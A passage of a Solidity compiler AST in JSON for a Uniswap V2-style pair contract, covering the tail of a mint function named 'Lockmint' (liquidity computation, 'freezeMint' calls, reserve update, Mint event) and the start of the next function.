																			"nodeType": "BinaryOperation",
																			"operator": "/",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1113,
																				"name": "_reserve0",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1029,
																				"src": "7268:9:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint112",
																					"typeString": "uint112"
																				}
																			},
																			"src": "7240:37:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1120,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 1117,
																						"name": "_totalSupply",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1079,
																						"src": "7307:12:1",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					],
																					"expression": {
																						"argumentTypes": null,
																						"id": 1115,
																						"name": "amount1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1065,
																						"src": "7295:7:1",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 1116,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"memberName": "mul",
																					"nodeType": "MemberAccess",
																					"referencedDeclaration": 2385,
																					"src": "7295:11:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																						"typeString": "function (uint256,uint256) pure returns (uint256)"
																					}
																				},
																				"id": 1118,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "7295:25:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "/",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1119,
																				"name": "_reserve1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1031,
																				"src": "7323:9:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint112",
																					"typeString": "uint112"
																				}
																			},
																			"src": "7295:37:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"id": 1107,
																			"name": "Math",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2311,
																			"src": "7214:4:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_contract$_Math_$2311_$",
																				"typeString": "type(library Math)"
																			}
																		},
																		"id": 1108,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "min",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 2256,
																		"src": "7214:8:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$",
																			"typeString": "function (uint256,uint256) pure returns (uint256)"
																		}
																	},
																	"id": 1121,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "7214:132:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "7202:144:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1123,
															"nodeType": "ExpressionStatement",
															"src": "7202:144:1"
														}
													]
												},
												"id": 1125,
												"nodeType": "IfStatement",
												"src": "6958:399:1",
												"trueBody": {
													"id": 1105,
													"nodeType": "Block",
													"src": "6981:201:1",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1096,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1085,
																	"name": "liquidity",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1026,
																	"src": "6995:9:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 1094,
																			"name": "MINIMUM_LIQUIDITY",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 462,
																			"src": "7043:17:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"arguments": [
																						{
																							"argumentTypes": null,
																							"id": 1090,
																							"name": "amount1",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1065,
																							"src": "7029:7:1",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						}
																					],
																					"expression": {
																						"argumentTypes": [
																							{
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						],
																						"expression": {
																							"argumentTypes": null,
																							"id": 1088,
																							"name": "amount0",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1058,
																							"src": "7017:7:1",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"id": 1089,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"memberName": "mul",
																						"nodeType": "MemberAccess",
																						"referencedDeclaration": 2385,
																						"src": "7017:11:1",
																						"typeDescriptions": {
																							"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																							"typeString": "function (uint256,uint256) pure returns (uint256)"
																						}
																					},
																					"id": 1091,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"kind": "functionCall",
																					"lValueRequested": false,
																					"names": [],
																					"nodeType": "FunctionCall",
																					"src": "7017:20:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 1086,
																					"name": "Math",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 2311,
																					"src": "7007:4:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_contract$_Math_$2311_$",
																						"typeString": "type(library Math)"
																					}
																				},
																				"id": 1087,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "sqrt",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": 2310,
																				"src": "7007:9:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_uint256_$",
																					"typeString": "function (uint256) pure returns (uint256)"
																				}
																			},
																			"id": 1092,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "7007:31:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 1093,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sub",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 2357,
																		"src": "7007:35:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																			"typeString": "function (uint256,uint256) pure returns (uint256)"
																		}
																	},
																	"id": 1095,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "7007:54:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "6995:66:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1097,
															"nodeType": "ExpressionStatement",
															"src": "6995:66:1"
														},
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"hexValue": "30",
																				"id": 1100,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "7094:1:1",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_0_by_1",
																					"typeString": "int_const 0"
																				},
																				"value": "0"
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_rational_0_by_1",
																					"typeString": "int_const 0"
																				}
																			],
																			"id": 1099,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "7086:7:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_address_$",
																				"typeString": "type(address)"
																			},
																			"typeName": "address"
																		},
																		"id": 1101,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "7086:10:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1102,
																		"name": "MINIMUM_LIQUIDITY",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 462,
																		"src": "7098:17:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	],
																	"id": 1098,
																	"name": "freezeMint",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 172,
																	"src": "7075:10:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
																		"typeString": "function (address,uint256) returns (bool)"
																	}
																},
																"id": 1103,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "7075:41:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"id": 1104,
															"nodeType": "ExpressionStatement",
															"src": "7075:41:1"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1129,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1127,
																"name": "liquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1026,
																"src": "7374:9:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1128,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "7386:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "7374:13:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "556e697377617056323a20494e53554646494349454e545f4c49515549444954595f4d494e544544",
															"id": 1130,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "7389:42:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_6591c9f5bf1fefaad109b76a20e25c857b696080c952191f86220f001a83663e",
																"typeString": "literal_string \"UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED\""
															},
															"value": "UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_6591c9f5bf1fefaad109b76a20e25c857b696080c952191f86220f001a83663e",
																"typeString": "literal_string \"UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED\""
															}
														],
														"id": 1126,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2446,
															2447
														],
														"referencedDeclaration": 2447,
														"src": "7366:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1131,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7366:66:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1132,
												"nodeType": "ExpressionStatement",
												"src": "7366:66:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1134,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1021,
															"src": "7453:2:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 1135,
															"name": "liquidity",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1026,
															"src": "7457:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1133,
														"name": "freezeMint",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 172,
														"src": "7442:10:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
															"typeString": "function (address,uint256) returns (bool)"
														}
													},
													"id": 1136,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7442:25:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1137,
												"nodeType": "ExpressionStatement",
												"src": "7442:25:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1139,
															"name": "balance0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1036,
															"src": "7486:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1140,
															"name": "balance1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1047,
															"src": "7496:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1141,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1029,
															"src": "7506:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 1142,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1031,
															"src": "7517:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 1138,
														"name": "_update",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 762,
														"src": "7478:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_uint256_$_t_uint256_$_t_uint112_$_t_uint112_$returns$__$",
															"typeString": "function (uint256,uint256,uint112,uint112)"
														}
													},
													"id": 1143,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7478:49:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1144,
												"nodeType": "ExpressionStatement",
												"src": "7478:49:1"
											},
											{
												"condition": {
													"argumentTypes": null,
													"id": 1145,
													"name": "feeOn",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1072,
													"src": "7541:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1155,
												"nodeType": "IfStatement",
												"src": "7537:47:1",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"id": 1153,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 1146,
															"name": "kLast",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 491,
															"src": "7548:5:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1151,
																	"name": "reserve1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 483,
																	"src": "7575:8:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 1148,
																			"name": "reserve0",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 481,
																			"src": "7561:8:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint112",
																				"typeString": "uint112"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint112",
																				"typeString": "uint112"
																			}
																		],
																		"id": 1147,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "7556:4:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint256_$",
																			"typeString": "type(uint256)"
																		},
																		"typeName": "uint"
																	},
																	"id": 1149,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "7556:14:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 1150,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "mul",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 2385,
																"src": "7556:18:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																	"typeString": "function (uint256,uint256) pure returns (uint256)"
																}
															},
															"id": 1152,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "7556:28:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "7548:36:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1154,
													"nodeType": "ExpressionStatement",
													"src": "7548:36:1"
												}
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 1157,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2443,
																"src": "7644:3:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 1158,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "7644:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 1159,
															"name": "amount0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1058,
															"src": "7656:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1160,
															"name": "amount1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1065,
															"src": "7665:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1156,
														"name": "Mint",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															585
														],
														"referencedDeclaration": 585,
														"src": "7639:4:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_uint256_$_t_uint256_$returns$__$",
															"typeString": "function (address,uint256,uint256)"
														}
													},
													"id": 1161,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7639:34:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1162,
												"nodeType": "EmitStatement",
												"src": "7634:39:1"
											}
										]
									},
									"documentation": null,
									"id": 1164,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 1024,
											"modifierName": {
												"argumentTypes": null,
												"id": 1023,
												"name": "lock",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 513,
												"src": "6438:4:1",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "6438:4:1"
										}
									],
									"name": "Lockmint",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1022,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1021,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 1164,
												"src": "6417:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1020,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "6417:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6416:12:1"
									},
									"returnParameters": {
										"id": 1027,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1026,
												"name": "liquidity",
												"nodeType": "VariableDeclaration",
												"scope": 1164,
												"src": "6452:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1025,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "6452:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6451:16:1"
									},
									"scope": 1700,
									"src": "6399:1281:1",
									"stateMutability": "nonpayable",
									"superFunction": 2197,
									"visibility": "external"
								},
								{
									"body": {
										"id": 1327,
										"nodeType": "Block",
										"src": "7880:1338:1",
										"statements": [
											{
												"assignments": [
													1176,
													1178,
													null
												],
												"declarations": [
													{
														"constant": false,
														"id": 1176,
														"name": "_reserve0",
														"nodeType": "VariableDeclaration",
														"scope": 1327,
														"src": "7891:17:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"typeName": {
															"id": 1175,
															"name": "uint112",
															"nodeType": "ElementaryTypeName",
															"src": "7891:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													{
														"constant": false,
														"id": 1178,
														"name": "_reserve1",
														"nodeType": "VariableDeclaration",
														"scope": 1327,
														"src": "7910:17:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"typeName": {
															"id": 1177,
															"name": "uint112",
															"nodeType": "ElementaryTypeName",
															"src": "7910:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													null
												],
												"id": 1181,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1179,
														"name": "getReserves",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 535,
														"src": "7933:11:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_view$__$returns$_t_uint112_$_t_uint112_$_t_uint32_$",
															"typeString": "function () view returns (uint112,uint112,uint32)"
														}
													},
													"id": 1180,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7933:13:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_uint112_$_t_uint112_$_t_uint32_$",
														"typeString": "tuple(uint112,uint112,uint32)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7890:56:1"
											},
											{
												"assignments": [
													1183
												],
												"declarations": [
													{
														"constant": false,
														"id": 1183,
														"name": "_token0",
														"nodeType": "VariableDeclaration",
														"scope": 1327,
														"src": "7971:15:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 1182,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "7971:7:1",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1185,
												"initialValue": {
													"argumentTypes": null,
													"id": 1184,
													"name": "token0",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 475,
													"src": "7989:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7971:24:1"
											},
											{
												"assignments": [
													1187
												],
												"declarations": [
													{
														"constant": false,
														"id": 1187,
														"name": "_token1",
														"nodeType": "VariableDeclaration",
														"scope": 1327,
														"src": "8020:15:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 1186,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "8020:7:1",
